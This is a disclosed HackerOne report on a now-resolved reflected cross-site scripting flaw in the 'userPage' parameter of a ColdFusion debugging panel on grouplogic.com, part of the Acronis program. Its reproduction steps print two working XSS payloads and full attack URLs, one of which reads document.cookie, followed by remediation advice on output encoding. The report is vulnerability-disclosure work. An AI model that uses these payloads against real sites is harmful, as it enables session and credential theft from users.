---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1166918'
original_report_id: '1166918'
title: Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: acronis
created_at: '2021-04-16T19:49:43.244Z'
disclosed_at: '2022-06-14T10:20:47.690Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: Other Acronis Domains
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm

## Metadata

- HackerOne Report ID: 1166918
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: acronis
- Disclosed At: 2022-06-14T10:20:47.690Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary
The ColdFusion Debugging Panel exposed at below URL.
```
http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=
```
The **userPage** parameter is not properly sanitized and is displayed  without proper output encoding. This results in reflected cross site scripting.

## Steps To Reproduce

Enter any of below payload in the **userPage** parameter and access the URL:

```
Payload 1: Mouse Over XSS
---------------------------
%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>


Payload 2: 
---------
%0d%0a</script><img+src=x+onerror=alert(document.domain)>

```

Or Just access below URLs in browser:

```
http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>

http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>

```


## Recommendations
It is highly recommended to implement output encoding.

Encode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ```(&, <, >, ", ')```:
```
 & --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
```

Reference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

## Impact

XSS can be used to :
- Steal cookies, password
- Website Defacement
- Redirect Victim to Malicious site
- Log keystrokes etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
